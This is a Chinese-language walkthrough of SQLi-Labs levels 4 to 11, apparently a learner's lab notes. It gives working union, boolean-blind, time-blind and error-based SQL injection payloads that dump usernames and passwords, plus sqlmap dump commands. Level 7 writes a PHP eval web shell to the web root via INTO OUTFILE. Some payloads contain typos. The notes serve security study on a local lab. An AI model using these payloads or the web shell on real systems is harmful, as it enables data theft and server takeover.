![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006212.png)



```sql
?id=-1') union select 1,2,group_concat(username,':',password) from users --+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006223.png)











#### Less-4-双引号+括号_字符型
less-4是双引号+括号的闭合方式

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006287.png)

修改一下闭合方式即可，其他与前三关一致。

```sql
?id=1") order by 3--+

?id=-1") union select 1,2,3--+

?id=-1") union select 1,database(),version()--+

?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+

?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+

?id=-1") union select 1,2,group_concat(username ,id , password) from users--+
```



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006953.png)













---

参考书籍：

[sqli-labs/mysql-injection.pdf at master · lcamry/sqli-labs](https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf)

#### Background 盲注的讲解
##### **1.什么是盲注？**
盲注是SQL注入时**不直接显示数据库错误信息或查询结果** ，攻击者无法直接通过页面回显获取数据，而是通过观察一些差异来推断信息：页面内容变化（如“存在/不存在”提示）、HTTP状态码（如200/500）、响应时间差异（时间盲注）。

简单来说就是页面不会返回sql语句执行错误的信息，我们需要通过页面的正常与不正常显示来判断。

##### **2、分类**
布尔盲注、时间盲注、报错盲注

---

##### **3、布尔盲注（Boolean-Based Blind SQLi）**
布尔盲注通过构造 **逻辑条件（真/假）**，观察页面返回结果的差异，逐位推断数据库信息。条件为真 → 页面显示正常内容（如“You are in...”）；条件为假 → 页面无内容或显示错误

**（1）如何判断布尔盲注？**

以 **SQLi-Labs Less-5** 为例：

**步骤1：确认注入点类型**

1. 输入 `?id=1'`，页面返回异常（可能为字符型注入）。
2. 闭合单引号：`?id=1' --+`，页面恢复正常 → **单引号字符型注入**。

**步骤2：验证布尔盲注**

构造 **真/假条件**，观察页面差异：

+ **真条件**：`?id=1' and 1=1 --+` → 页面正常（如显示内容）。
+ **假条件**：`?id=1' and 1=2 --+` → 页面异常（无内容）。

**结论**：存在布尔盲注，页面根据条件真/假返回不同结果。

**（2）布尔盲注的利用步骤**

**1. 获取数据库名**

+ **猜解长度**：  
`?id=1' and length(database())=8 --+` → 若页面正常，数据库名长度为8。
+ **逐字符猜解**：  
`?id=1' and substr(database(),1,1)='s' --+` → 第1个字符是否为`s`（重复至第8个字符）。

**2. 获取表名**

+ **猜解表的数量**：  
`?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+` → 确认是否为4张表。
+ **猜解表名长度**：  
`?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+` → 第一张表名长度是否为6。
+ **逐字符猜解表名**：  
`?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='e' --+` → 第一张表的第1个字符是否为`e`。

**3. 获取列名**

+ **猜解列的数量**：  
`?id=1' and (select count(column_name) from information_schema.columns where table_name='users')=3 --+` → 确认是否为3列。
+ **逐字符猜解列名**：  
`?id=1' and substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='i' --+` → 第一列的第1个字符是否为`i`。

**4. 提取数据（如用户名/密码）**

+ **猜解第一条记录的username**：  
`?id=1' and substr((select username from users limit 0,1),1,1)='D' --+` → 用户名的第1个字符是否为`D`。
+ **猜解对应密码**：  
`?id=1' and substr((select password from users limit 0,1),1,1)='D' --+` → 密码的第1个字符是否为`D`。



---

##### **4、时间盲注**
**（1）什么是时间盲注？**

攻击者通过构造SQL语句触发数据库延迟执行（如`SLEEP(2)`），根据响应时间的长短判断注入条件是否为真。

**（2）如何判断时间盲注？**

1. **基本测试**  
输入触发延迟的Payload，观察响应时间是否显著增加：`?id=1' AND SLEEP(5) --+`若页面加载时间超过5秒，可能存在时间盲注漏洞。
2. **条件化测试**  
结合逻辑条件验证：`?id=1' AND IF(1=1, SLEEP(5), 0) --+  # 条件为真，触发延迟  
?id=1' AND IF(1=2, SLEEP(5), 0) --+  # 条件为假，不延迟`若第一个请求延迟，第二个不延迟 → 确认时间盲注存在。



**(3)时间盲注利用步骤**

**1. 获取数据库名**

**1.1 猜解数据库名长度**

```sql
?id=1' AND IF(LENGTH(database())=8, SLEEP(2), 0) --+
```

若延迟2秒，数据库名长度为8（如`security`）。

**1.2 逐字符猜解数据库名**

```sql
?id=1' AND IF(ASCII(SUBSTR(database(),1,1))=115, SLEEP(2), 0) --+
```

+ `SUBSTR(database(),1,1)`：提取数据库名第1个字符。
+ `ASCII(...)=115`：判断是否为字符`s`（ASCII码115）。
+ 若延迟，则确认该字符正确。

**2. 获取表名**

**2.1 猜解表的数量**

```sql
?id=1' AND IF((SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())=4, SLEEP(2), 0) --+
```

若延迟，当前数据库有4张表。

**2.2 猜解表名长度**

```sql
?id=1' AND IF(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=6, SLEEP(2), 0) --+
```

若延迟，第一张表名长度为6（如`emails`）。

**2.3 逐字符猜解表名**

```sql
?id=1' AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))=101, SLEEP(2), 0) --+
```

+ 判断第一个表的第1个字符是否为`e`（ASCII码101）。

**3. 获取列名**

**3.1 猜解列的数量**

```sql
?id=1' AND IF((SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='users')=3, SLEEP(2), 0) --+
```

若延迟，`users`表有3列。

**3.2 逐字符猜解列名**

```sql
?id=1' AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1))=105, SLEEP(2), 0) --+
```

+ 判断第一列的第1个字符是否为`i`（ASCII码105）。

**4. 提取数据（以用户密码为例）**

**4.1 猜解用户名的第一个字符**

```sql
?id=1' AND IF(ASCII(SUBSTR((SELECT username FROM users LIMIT 0,1),1,1))=68, SLEEP(2), 0) --+
```

+ 若延迟，用户名的第一个字符为`D`（ASCII码68）。

**4.2 猜解密码**

```sql
?id=1' AND IF(ASCII(SUBSTR((SELECT password FROM users LIMIT 0,1),1,1))=68, SLEEP(2), 0) --+
```

+ 若延迟，密码的第一个字符为`D`。

---

##### **5、使用ASCII码 + 二分法优化**
将字符转换为ASCII码值，利用二分法快速缩小范围。

**步骤1：将字符转为ASCII码**

+ `'s'`的ASCII码为`115`。
+ 通过比较ASCII码值，快速定位字符。

**步骤2：二分法猜解**

1. **确定ASCII码范围**：假设字符为可打印字符（ASCII 32-126）。
2. **逐步缩小范围**：

```sql
?id=1' AND ascii(substr(database(),1,1)) > 100 --+  # 是否大于100？
```

    - 若页面正常（条件为真），说明ASCII码在101-126之间。
    - 若页面异常（条件为假），说明ASCII码在32-100之间。
3. **重复二分**，直到锁定具体值。

**示例**：

```sql
# 猜解第一个字符的ASCII码是否为115（即's'）
?id=1' AND ascii(substr(database(),1,1))=115 --+
```



#### Less-5-单引号字符型\_布尔盲注\_报错注入
**布尔盲注**

判断

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007470.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006670.png)



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022006258.png)



单引号字符型注入

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007326.png)



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007306.png)



页面根据条件真/假返回不同结果，说明存在布尔盲注，



**1. 获取数据库名**

+ **猜解长度**：  
`?id=1' and length(database())=8 --+` 		页面正常，数据库名长度为8。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007042.png)

+ **逐字符猜解**：  
`?id=1' and substr(database(),1,1)='s' --+` 		 第1个字符是否为`s`（重复至第8个字符）。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007799.png)

**猜解过程**：

1. 第1个字符：从ASCII码范围（通常测试 `a-z`、`0-9`、`_`）逐一尝试，直到页面正常。
2. 第2个字符：修改为 `substr(database(),2,1)`，重复上述过程。
3. 重复至第8个字符（`substr(database(),8,1)`）。



**ASCII码范围解析**

| 字符类型 | ASCII码范围 | 包含字符示例 |
| :---: | :---: | :---: |
| 数字 | 48-57 | `0`(48) ~ `9`(57) |
| 下划线 | 95 | `_` |
| 小写字母 | 97-122 | `a`(97) ~ `z`(122) |


**2. 获取表名**

+ **猜解表的数量**：  
`?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+` → 确认为4张表。
+ ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007369.png)
+ **猜解表名长度**：  
`?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+` → 第一张表名长度为6。
+ **逐字符猜解表名**：  
`?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='e' --+` → 第一张表的第1个字符为`e`。

**3. 获取列名**

+ **猜解列的数量**：  
`?id=1' and (select count(column_name) from information_schema.columns where table_name='users')=3 --+` → 确认为3列。
+ **逐字符猜解列名**：  
`?id=1' and substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='i' --+` → 第一列的第1个字符为`i`。

**4. 提取数据（如用户名/密码）**

+ **猜解第一条记录的username**：  
`?id=1' and substr((select username from users limit 0,1),1,1)='D' --+` → 用户名的第1个字符为`D`。
+ **猜解对应密码**：  
`?id=1' and substr((select password from users limit 0,1),1,1)='D' --+` → 密码的第1个字符为`D`。





**报错注入**

这一关也可以使用报错注入

[sqli-labs---第五关_sqli-labs第五关-CSDN博客](https://blog.csdn.net/2201_75556700/article/details/139115543?ops_request_misc=%7B%22request%5Fid%22%3A%229b61cf9573e1a1353819cc64e0d1888b%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=9b61cf9573e1a1353819cc64e0d1888b&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-139115543-null-null.142^v102^pc_search_result_base7&utm_term=sqli-labs-5&spm=1018.2226.3001.4187)

[sql-labs 闯关 5~10_sqli-labs5-CSDN博客](https://blog.csdn.net/qq_44663230/article/details/126200616?ops_request_misc=&request_id=&biz_id=102&utm_term=sqli-labs-5&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-126200616.142^v102^pc_search_result_base7&spm=1018.2226.3001.4187)



1.floor报错



用floor报错注入，得到数据库名称为’security’

```sql
?id=1' and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(database())))--+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007315.png)

**语句解析**

+ `?id=1'`  
闭合原始 SQL 语句的单引号，进入注入逻辑。
+ `and`  
将注入的恶意代码与原始查询逻辑连接，使整个语句结果为布尔值。
+ `select count(*) from information_schema.tables`  
从系统表 `information_schema.tables`（存储所有表信息）中选择所有行数。此步骤仅用于生成足够多的数据以触发后续的 `group by` 报错。
+ `group by concat(...)`  
关键报错触发点。`group by` 子句会对结果按指定表达式分组，而 `concat(...)` 生成的字符串将作为分组键。由于 `floor(rand(14)*2)` 的随机性（但种子固定为 `14`），在分组时可能出现重复键冲突，导致报错。
+ `floor(rand(14)*2)`
    - `rand(14)`：生成一个基于种子 `14` 的伪随机数（固定序列）。
    - `rand(14)*2`：将随机数范围扩展到 [0, 2)。
    - `floor()`：向下取整，结果为 `0` 或 `1`。
    - **作用**：生成确定性序列的 0 或 1，用于构造重复的分组键。
+ `0x23`  
十六进制表示的字符 `#`，作为分隔符提高报错信息的可读性。
+ `database()`  
内置函数，返回当前数据库名称（此处为 `security`）。
+ **报错机制**  
由于 `group by` 在临时表生成过程中需要为每行计算分组键，而 `floor(rand(14)*2)` 的值在计算过程中可能变化，导致同一分组键被多次插入临时表时触发 `Duplicate entry` 错误。报错信息会包含 `concat(...)` 的结果，从而泄露 `database()` 的值。



得到数据表名称

```sql
?id=1' and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select group_concat(table_name) from information_schema.tables where table_schema='security')))--+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007738.png)

+ `select group_concat(table_name) ...`
    - `group_concat()`：将多行结果合并为单个字符串（例如 `users,emails,products`）。
    - `information_schema.tables`：系统表，存储所有数据库的表信息。
    - `where table_schema='security'`：筛选属于 `security` 数据库的表。
+ **报错信息泄露**  
报错信息中会包含所有表名的拼接结果（如 `users,emails,...`）。





得到字段名

```sql
?id=1' and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users')))--+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007739.png)

+ `information_schema.columns`  
系统表，存储所有表的列（字段）信息。
+ `where table_name='users'`  
筛选 `users` 表的字段名（如 `id,username,password`）。







```sql
?id=1' and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select group_concat(username) from users)))--+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007226.png)

用翻译软件翻译出来的意思是[子查询返回超过 1 行]，所以用count函数统计看看有多少数据

**错误提示**：`子查询返回超过 1 行`  
`group_concat(username)` 会将所有 `username` 合并为一个字符串（如 `admin,user1,user2`），但由于某些环境限制（如 MySQL 版本或配置），过长的字符串可能导致报错信息截断或无法触发预期错误。





```sql
?id=1' and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select count(username) from users)))--+
```

得到username有13个，既然输出一行，那么用limit一个一个输出

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007166.png)

+ `count(username)`  
统计 `users` 表中 `username` 的数量（如 `13`），避免返回多行数据。
+ **作用**：确定需要分页获取数据的总量。





```sql
?id=1' and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select username from users limit 0,1)))--+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007609.png)

得到第一个用户账户

+ `limit 0,1`  
限制子查询返回一行数据（`0` 表示起始位置，`1` 表示数量）。
+ **逐步遍历**  
修改 `limit 1,1`、`limit 2,1` 等获取后续数据。





```sql
?id=1' and (select count(*) from information_schema.tables group by concat(floor(rand(14)*2),0x23,(select username from users limit 1,1)))--+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022007530.png)

得到第二个用户账户

以此类推，得到所有账户密码



2.updatexml报错  
?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1)--+

得到数据库名称

?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+



得到数据表名称

?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)--+



得到字段名称

?id=1' and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1)--+



得到用户名



3.extractvalue报错  
?id=1' and extractvalue(1,concat(0x23,database(),0x23))--+

得到数据库名称



?id=1' and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x23))--+



得到数据表名称



得到字段名称



?id=1' and extractvalue(1,concat(0x23,(select group_concat(username) from users),0x23))--+



得到用户名称，但明显可以看出，还没显示完整，用limit逐个查看

?id=1' and extractvalue(1,concat(0x23,(select username from users limit 0,1),0x23))--+



查看第一个账户名称





#### Less-6-单引号字符型\_布尔盲注\_报错注入
这一关与less-5的区别在于注入点不同，less-5是单引号，less-6是双引号，其他的都一样，可以用布尔盲注，也可以用updatexml报错注入。

先判断出注入点是双引号



?id=1"  and updatexml(1,concat(0x7e,database(),0x7e),1)--+

得到数据库名称

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022008410.png)





?id=1"  and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+

得到数据表名称

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022008470.png)







?id=1"  and updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users')),1) --+	

得到字段名称

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022008950.png)





?id=1" and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1)--+  
得到用户名

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022008893.png)





由于结果显示不全 可以使用limit来逐个查询

?id=1" and updatexml(1,concat(1,(select username from users limit 0,1) ),1) --+

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022008212.png)





#### Less-7-单引号+双括号_outfile函数
```sql
?id=1
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009634.png)

经过试验，闭合方式是字符型`'))`

```sql
?id=1'))--+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009623.png)

正常返回 `You are in.... Use outfile...... ` 错误返回 `You have an error in your SQL syntax`

[Mysql之outfile_mysql outfile-CSDN博客](https://blog.csdn.net/JCY1009015337/article/details/53038104?ops_request_misc=%7B%22request%5Fid%22%3A%22e4c27b101ddef8d9f30b7bae6e7ea27b%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=e4c27b101ddef8d9f30b7bae6e7ea27b&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-53038104-null-null.142^v102^pc_search_result_base7&utm_term=outfile&spm=1018.2226.3001.4187)







```sql
?id=1')) order by 3 --+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009298.png)





##### 方法一：outfile导出文件
在less7中，因为它报错不返回报错的数据库信息，我们无法获取到网站路径，我们可以在1-6关中注入获得数据库路径，

```sql
?id=-1' union select 1,2,@@datadir --+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009327.png)

`@@datadir`返回的是数据库存储数据的路径，而我们知道网站路径是在`WWW`目录下，那么结合`@@datadir`我们可以推断出网站的绝对路径为 `D:\CTF-Tools\phpstudy_pro\WWW\`





```sql
?id=1')) and (select count(*) from mysql.user)>0 --+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009701.png)

返回正常则有读取权限



模板：`?id=1')) union select (sql语句) into outfile '路径' --+`

```sql
?id=1')) union select 1,2,3 into outfile 'D:\\CTF-Tools\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\1.txt' --+
```

写入失败，之后找到问题是权限过低，需要打开`phpstudy\MySQL\my.ini`文件，在其中加上一句：`secure_file_priv="/"`

`D:\CTF-Tools\phpstudy_pro\Extensions\MySQL5.7.26\my.ini`

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009595.png)



已经生成了`1.txt`

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022009239.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022010650.png)







写一句话木马

```sql
?id=1')) union select 1,2,'<?php @eval($_POST["admin"])?>' into outfile "D:\\CTF-Tools\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\1.php" --+
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022010904.png)



蚁剑连接成功



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022011888.png)



**注意**

参考文章：[sqlilabs—less7_less-7-CSDN博客](https://blog.csdn.net/song123sh/article/details/123724719?ops_request_misc=%7B%22request%5Fid%22%3A%22795b77a816914f9f51d9a3bc6abeeca1%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=795b77a816914f9f51d9a3bc6abeeca1&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-123724719-null-null.142^v102^pc_search_result_base7&utm_term=sqli-labsless7&spm=1018.2226.3001.4187)

对文件进行导入导出首先得要有足够的权限，但是mysql默认不能导入和导出文件，这与`secure_file_priv`的值有关（默认为null)。`secure-file-priv`参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。  
1、当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出  
2、当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下  
3、当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制  
用以下命令查看secure_file_priv的值

`show variables like ‘%secure%’；`

由于先前已做过修改，这里显示的是可导入导出

如果是null，想得到导入导出权限，可以在my.ini文件[mysqld]的后面加上secure_file_priv=’’（两个英文单引号），然后重启phpstudy即可

1、outfire 后面的路径为绝对路径且存在  
2、要有足够的权限  
3、注入的内容也可以是字符串，句子  
4、要想注入新内容，需要新的文件名

这里写入文件的时候，需要注意的是利用数据库file权限向操作系统写入文件时，对于相同文件名的文件不能覆盖，所以如果第一次上传1.php，下次再上传1.php，就是无效命令了，也就是新的test.php中的内容并不会覆盖之前的1.php



#### Less-8
基本上和less-5一样



[自动化SQL注入测试工具 sqlmap 使用手册 - FreeK0x00 - 博客园](https://www.cnblogs.com/wuhongbin/p/15582981.html)

[SQLmap使用教程图文教程（非常详细）从零基础入门到精通，看完这一篇就够了。-CSDN博客](https://blog.csdn.net/shanguicsdn111/article/details/142088764)



`-u`[url]

`-D`[数据库]

`-T`[表]

`-C`[字段]

`--dbs`[列出所有数据库]

`--tables`[列出数据库所有表]

`--dump`[导出表的数据]

`--batch`[自动选择默认选项（避免交互式提问）]

这里使用sqlmap

python sqlmap.py -u [http://sqli-labs:8080/Less-9/?id=1](http://sqli-labs:8080/Less-9/?id=1) --batch

```plain
python sqlmap.py -u http://sqli-labs:8080/Less-8/id?=1
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022011477.png)

返回的注入点有布尔盲注和时间盲注

数据库是Mysql

接下来爆数据库

```plain
python sqlmap.py -u http://sqli-labs:8080/Less-8/id?=1 --dbs
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022011729.png)



查看`security`

```plain
python sqlmap.py -u http://sqli-labs:8080/Less-8/?id=1 -D security --tables
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022011341.png)



查看`users`

```plain
python sqlmap.py -u http://sqli-labs:8080/Less-8/?id=1 -T users --dump
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022011299.png)



#### Less-9-单引号-时间盲注
python sqlmap.py -u [http://sqli-labs:8080/Less-9/?id=1](http://sqli-labs:8080/Less-9/?id=1) --current-db --batch



无论id等于多少都显示`You are in ....`

```plain
?id=1
?id=1'
?id=1"

```



这一关用到的是时间盲注

```plain
?id=1' and sleep(3) --+
```

当传入上面的语句时，页面延迟了三秒，确定为单引号



##### 时间盲注步骤：
###### **获取数据库名**
1.1 猜解数据库名长度语法：

```sql
?id=1' and if(length(database())=x,sleep(5),1)--+
/*通过变换 x 的值来确定数据库名的长度，得到数据库名的长度为8。*/
```

```sql
id=1' and if(leng(database())=8,sleep(5),1)--+
```

1.2 猜测数据库：  
语法：

```sql
?id=1' and if(ascii(substr(database(),x,1))=y, sleep(2), 0) --+
```

测试第一位：

```sql
?id=1' and if(ascii(substr(database(),1,1))=115, sleep(2), 0) --+
```

测得第一位是 s

```sql
?id=1' and if(ascii(substr(database(),2,1))=101, sleep(5), 1)--+
```



得到第二位是 e（ascii 码是 101）… 以此类推，知道了数据库名是 **security**

###### **获取表名**
2.1 猜解表的数量

```sql
?id=1' and if((select count(table_name) from information_schema.tables where table_schema=database())=4, sleep(2), 0) --+
```

若延迟，当前数据库有4张表。

2.2 猜解表名长度

```sql
?id=1' and if(lentgh((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6, sleep(2), 0) --+
```

若延迟，第一张表名长度为6（如`emails`）。

2.3 逐字符猜解表名

```sql
?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101, sleep(2), 0) --+
```

判断第一个表的第1个字符是否为`e`（ASCII码101）。

猜得第一个数据表的第一位是 e,…依次类推，得到 emails

```sql
?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114,sleep(5),1)--+
```

得到第二个数据表的第一位是 r,…依次类推，得到 referers … 

再以此类推，我们可以得到所有的数据表 emails，referers，uagents，users。

接下来判断字段名与数据内容，还是和上面一样的套路，判断长度，判断名字

###### **获取列名**
3.1 猜列数

```sql
?id=1' and if((select count(column_name) from information_schema.columns where table_name='users')=3, sleep(2), 0) --+
```

若延迟，`users`表有3列。

3.2 猜列名

```sql
?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105,sleep(2),0)--+
```

判断第一列的第1个字符是否为`i`（ASCII码105）。

猜测 users 表的列：

猜得 users 表的第一个列的第一个字符是 i， 以此类推，得到列名是 id，username，password

###### **提取数据**
4.1 猜用户名的第一个字符

```plain
?id=1' and if(ascii(substr((select username from users limit 0,1), 1,1))=68,sleep(5),1)--+
```

猜得 username 的第一行的第一位，以此类推，得到 username，password 字段的所有内容。



+ `substr(...,x,y)` - 从位置 x 开始截取 y 个字符
+ `ascii()` - 获取字符的 ASCII 码值
+ `(select count(table_name) from information_schema.tables where table_schema=database())=4`
    - `information_schema.tables` - 系统表，包含所有表信息
    - `table_schema=database()` - 限制在当前数据库
    - `count(table_name)` - 计算表数量
    - `=4` - 猜测当前数据库有4个表



##### 总结时间盲注：
```sql
?id=1 and sleep(1)--+

?id=1' and sleep(1)--+

?id=1' AND IF(LENGTH(database())<10,sleep(1),1)--+

#二分法测试数据库长度
?id=1' AND IF(LENGTH(database())=8,sleep(1),1)--+

#使用 left() 函数判断数据库名的第一位是否是字符 a，注入之后响应很快说明数据库名第一位不是 a。
?id=1' AND IF(LEFT((SELECT database()), 1)='a',sleep(1),1)--+

#使用穷举法进行测试，得出数据库名的第一个字符为 “s”。
?id=1' AND IF(LEFT((SELECT database()), 1)='s',sleep(1),1)--+

#接下来得出数据库名，再使用同样的方法继续爆破表名、字段名及其剩余信息。
?id=1' AND IF(LEFT((SELECT database()), 8)='security',sleep(1),1)--+

```







#### Less-10-双引号-时间盲注
和less-9一样，注入点变为`"`



```plain
判断是双引号的时间盲注
?id=1" and sleep(2) --+

数据库名长度
?id=1" and if(length(database())=8,sleep(5),1)--+

数据库名猜测
第一位（s	115）：
?id=1" and if(ascii(substr(database(),1,1))=115, sleep(2), 0) --+
第二位（e	101）：
?id=1" and if(ascii(substr(database(),2,1))=101, sleep(2), 0) --+
以此类推，得到数据库名security

security库中表的数量
?id=1" and if((select count(table_name) from information_schema.tables where table_schema=database())=4, sleep(2), 0) --+

security库中第一张表的长度
?id=1" and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6, sleep(2), 0) --+

security库中的表名
第一张表第一位字符（e	101）：
?id=1" and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101, sleep(2), 0) --+
依此类推，得到所有的数据表emails，referers，uagents，users。


###############问题：users表的列数
?id=1" and if((select count(column_name) from information_schema.columns where table_name='users')=4, sleep(2), 0) --+

users表的第一列列名（i	105）：
?id=1" and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105,sleep(2),0)--+
依此类推，得到列名是 id，username，password

username中用户名的字符（D	68):
?id=1" and if(ascii(substr((select username from users limit 0,1), 1,1))=68,sleep(5),1)--+
```



#### Less-11-'-POST-union
尝试输入admin/admin，登录成功了。。。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022012937.png)





尝试输入admin/aaa（密码随便）

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022012805.png)

输入1'

出现了报错 `You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near ''1'' and  password='' LIMIT 0,1' at line 1`

引号不匹配，`'1''` 显示单引号没有正确闭合；空密码比较

输入1'#，可以确定是字符型注入

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022012912.png)







##### 方法一联合注入
用 union 注入进行尝试：  
`1' union select 1,database() #`

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022012780.png)

显示出数据库：`security`



也可以判断字段数

a' order by 1 -- a

a' order by 2 -- a

a' order by 3 -- a

第3个字段排序时开始报错，确定返回结果的字段数为 2。



获取所有数据库，

a' union select 1,(select group_concat(schema_name) from information_schema.schemata)  -- a



获取 security 库的所有表，

a' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema="security")  -- a



 获取 users 表的所有字段

a' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema="security" and table_name="users")  -- a



 获取数据库用户的密码

a' union select 1,group_concat(id, ':', username, ':', password) from security.users -- a



##### 方式二：报错注入
判断是否报错   
a'

报错`You have an error in your SQL syntax; check the manual that corresponds to  your MySQL server version for the right syntax to use near ''a'' and  password='' LIMIT 0,1' at line 1`适合使用报错注入。



判断报错条件  
a' and updatexml(1,0x7e,3) -- a

 页面正常显示报错信息，确定报错函数可以使用。



获取所有数据库，

a' and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),33,31)),3) -- a



获取 security 库的所有表，

